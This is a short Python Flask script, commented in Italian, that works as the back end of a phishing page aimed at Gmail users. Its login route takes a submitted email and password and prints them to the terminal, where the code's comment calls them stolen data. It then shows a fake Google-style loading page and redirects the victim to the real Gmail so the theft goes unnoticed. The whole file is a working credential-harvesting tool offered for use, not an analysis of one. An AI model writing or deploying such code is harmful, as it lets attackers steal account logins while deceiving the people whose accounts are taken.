from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    # Stampiamo i dati rubati nel terminale
    print("\n" + "!"*40)
    print(f"EMAIL: {email}")
    print(f"PASSWORD: {password}")
    print("!"*40 + "\n")

    # Restituiamo una pagina con lo spinner di caricamento di Google
    return """
    <html>
    <head>
        <style>
            body { font-family: 'Roboto', arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background: white; }
            .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            p { color: #5f6368; font-size: 16px; }
        </style>
        <script>
            // Dopo 4 secondi di "caricamento", manda l'utente alla vera Gmail
            setTimeout(function(){
                window.location.href = "https://mail.google.com";
            }, 4000);
        </script>
    </head>
    <body>
        <div class="loader"></div>
        <p>Controllo delle informazioni in corso...</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(port=5000)